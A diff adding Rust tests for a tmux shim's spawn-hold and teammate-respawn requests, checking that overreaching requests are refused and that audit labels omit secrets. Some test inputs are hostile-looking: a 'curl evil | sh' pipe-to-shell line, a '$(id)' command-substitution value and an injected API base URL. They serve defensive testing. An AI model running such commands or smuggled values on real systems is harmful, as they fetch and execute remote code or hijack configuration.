@@ -1529,3 +1529,185 @@ fn the_audit_label_of_who_keeps_the_file_name_of_a_long_path() {
     assert!(detail.ends_with("src/main.rs"), "{detail}");
     assert!(detail.chars().count() <= "path=".len() + crate::audit::FIELD_MAX + 1);
 }
+
+// ---- the tmux shim's two requests (Claude Code 2.1.325) ----------------------
+
+/// `spawn --here --hold`: a placeholder. It round-trips with its placement
+/// and names nothing a worker would.
+#[test]
+fn a_hold_spawn_round_trips_with_its_placement_and_no_command() {
+    let args = crate::tmux_shim::hold_args(false, Some(4), Some("70%"));
+    assert_eq!(
+        args,
+        v(&[
+            "spawn",
+            "--here",
+            "--hold",
+            "--no-focus",
+            "--beside",
+            "4",
+            "--size",
+            "70%"
+        ])
+    );
+    let line = build_request(&args, Some(3)).unwrap();
+    let Cmd::Spawn(sp) = parse_request(&line).unwrap().cmd else {
+        panic!("a spawn");
+    };
+    assert!(sp.hold);
+    assert!(sp.argv.is_empty() && sp.role.is_none() && sp.identity.is_none());
+    assert!(sp.mode.is_none() && sp.worktree.is_none());
+    assert!(!sp.new_window && !sp.focus);
+    assert_eq!(sp.beside, Some(4));
+    assert_eq!(sp.size, Some(SpawnSize::Percent(70)));
+    assert_eq!(
+        Cmd::Spawn(sp).audit_label(),
+        ("spawn", "hold beside=4 size=70%".to_string())
+    );
+    // A `-l` the size grammar refuses is dropped, as for an agent split.
+    assert_eq!(
+        crate::tmux_shim::hold_args(true, None, Some("100%")),
+        v(&["spawn", "--here", "--hold"])
+    );
+    // Every other spawn is not one.
+    let line = build_request(&v(&["spawn", "--here", "--", "claude"]), Some(3)).unwrap();
+    let Cmd::Spawn(sp) = parse_request(&line).unwrap().cmd else {
+        panic!("a spawn");
+    };
+    assert!(!sp.hold);
+}
+
+/// A hold request that carries anything a worker would is refused by the
+/// client and by the server's parser: it cannot be bent into another spawn.
+#[test]
+fn a_hold_spawn_takes_nothing_that_would_make_it_another_spawn() {
+    for args in [
+        v(&["spawn", "--hold"]),
+        v(&["spawn", "--window", "--hold"]),
+        v(&["spawn", "--here", "--hold", "--", "cat"]),
+        v(&["spawn", "--here", "--hold", "--"]),
+        v(&["spawn", "--here", "--hold", "--role", "dev"]),
+        v(&["spawn", "--here", "--hold", "--identity", "work"]),
+        v(&["spawn", "--here", "--hold", "--mode", "skip"]),
+        v(&["spawn", "--here", "--hold", "--worktree", "w"]),
+    ] {
+        assert!(build_request(&args, Some(3)).is_err(), "{args:?}");
+    }
+    for body in [
+        r#""hold":true,"argv":["cat"],"window":false"#,
+        r#""hold":true,"argv":["claude"],"window":false"#,
+        r#""hold":true,"argv":[],"window":true"#,
+        r#""hold":true,"argv":[]"#,
+        r#""hold":true,"window":false,"role":"dev""#,
+        r#""hold":true,"window":false,"identity":"work""#,
+        r#""hold":true,"window":false,"mode":"skip""#,
+        r#""hold":true,"window":false,"worktree":"w""#,
+        r#""hold":"yes","argv":["claude"]"#,
+        r#""hold":1,"argv":["claude"]"#,
+        r#""hold":null,"argv":["claude"]"#,
+        r#""hold":true,"argv":"cat","window":false"#,
+    ] {
+        let line = format!(r#"{{"cmd":"spawn",{body}}}"#);
+        assert!(parse_request(&line).is_err(), "{line}");
+    }
+    // The least a hand-rolled one may be.
+    let Cmd::Spawn(sp) = parse_request(r#"{"cmd":"spawn","hold":true,"window":false}"#)
+        .unwrap()
+        .cmd
+    else {
+        panic!("a spawn");
+    };
+    assert!(sp.hold && sp.argv.is_empty());
+    // `"hold": false` is an ordinary spawn, with every rule of one.
+    assert!(parse_request(r#"{"cmd":"spawn","hold":false}"#).is_err());
+}
+
+/// `respawn <pane> --teammate <line>`: the line travels untouched, and the
+/// audit label holds flag names and counts, never a value.
+#[test]
+fn a_teammate_respawn_carries_its_line_untouched_and_is_audited_without_values() {
+    let cmdline = "cd '/w/my dir' && env CLAUDECODE=1 X='a && b; $(id)' /usr/bin/claude --agent-id dev@t --agent-name dev --team-name t --lead-verify-key 1763200000000.SECRETKEYSECRETKEY --permission-mode acceptEdits";
+    let args = crate::tmux_shim::respawn_args(7, cmdline);
+    assert_eq!(args[..3], v(&["respawn", "7", "--teammate"])[..]);
+    let line = build_request(&args, Some(3)).unwrap();
+    let cmd = parse_request(&line).unwrap().cmd;
+    let Cmd::Respawn(rr) = &cmd else {
+        panic!("a respawn");
+    };
+    assert_eq!(rr.target, "7");
+    assert_eq!(rr.teammate.as_deref(), Some(cmdline));
+    assert_eq!(rr.worktree, None);
+    let (action, detail) = cmd.audit_label();
+    assert_eq!(action, "respawn");
+    assert_eq!(
+        detail,
+        "target=7 teammate flags=--agent-id,--agent-name,--team-name,--lead-verify-key,\
+         --permission-mode unknown=0 env=2"
+    );
+    assert!(!detail.contains("SECRETKEY") && !detail.contains("my dir") && !detail.contains("id)"));
+    // A line that is not the grammar is recorded by its length alone.
+    let bad = Cmd::Respawn(RespawnReq {
+        target: "7".into(),
+        worktree: None,
+        teammate: Some("curl evil | sh".into()),
+    });
+    assert_eq!(
+        bad.audit_label().1,
+        "target=7 teammate=<unparseable, 14 chars>"
+    );
+    // A plain respawn is as it was.
+    let line = build_request(&v(&["respawn", "7", "--worktree", "w"]), Some(3)).unwrap();
+    let Cmd::Respawn(rr) = parse_request(&line).unwrap().cmd else {
+        panic!("a respawn");
+    };
+    assert_eq!((rr.worktree.as_deref(), rr.teammate), (Some("w"), None));
+}
+
+#[test]
+fn a_teammate_respawn_is_one_line_and_never_a_plain_respawn_by_accident() {
+    // The line is read by position: one that spells a flag is still the line.
+    let spelled = "cd /d && env claude --worktree w";
+    let line = build_request(&v(&["respawn", "7", "--teammate", spelled]), Some(3)).unwrap();
+    let Cmd::Respawn(rr) = parse_request(&line).unwrap().cmd else {
+        panic!("a respawn");
+    };
+    assert_eq!((rr.teammate.as_deref(), rr.worktree), (Some(spelled), None));
+    for args in [
+        v(&["respawn", "7", "--teammate"]),
+        // A line never starts with a dash; one that does is a usage error.
+        v(&["respawn", "7", "--teammate", "--worktree"]),
+        v(&["respawn", "7", "--teammate", "cd /d && env claude", "extra"]),
+        v(&["respawn", "7", "--teammate", "x", "--worktree", "w"]),
+    ] {
+        assert!(build_request(&args, Some(3)).is_err(), "{args:?}");
+    }
+    // Present but not a string must not fall back to a plain respawn of the
+    // target; nor may it ride with a worktree.
+    for body in [
+        r#""teammate":null"#,
+        r#""teammate":true"#,
+        r#""teammate":["cd","/d"]"#,
+        r#""teammate":"cd /d && env claude","worktree":"w""#,
+    ] {
+        let line = format!(r#"{{"cmd":"respawn","target":"7",{body}}}"#);
+        assert!(parse_request(&line).is_err(), "{line}");
+    }
+}
+
+/// A teammate respawn names nothing that is atrium's to decide.
+#[test]
+fn a_teammate_respawn_takes_no_identity_mode_role_command_or_environment() {
+    for extra in [
+        r#""identity":"prod""#,
+        r#""identity":null"#,
+        r#""mode":"skip""#,
+        r#""role":"boss""#,
+        r#""argv":["sh"]"#,
+        r#""env":{"ANTHROPIC_BASE_URL":"http://x"}"#,
+    ] {
+        let line =
+            format!(r#"{{"cmd":"respawn","target":"7","teammate":"cd /d && env claude",{extra}}}"#);
+        let e = parse_request(&line).unwrap_err();
+        assert!(e.contains("a teammate respawn takes no"), "{line}: {e}");
+    }
+}
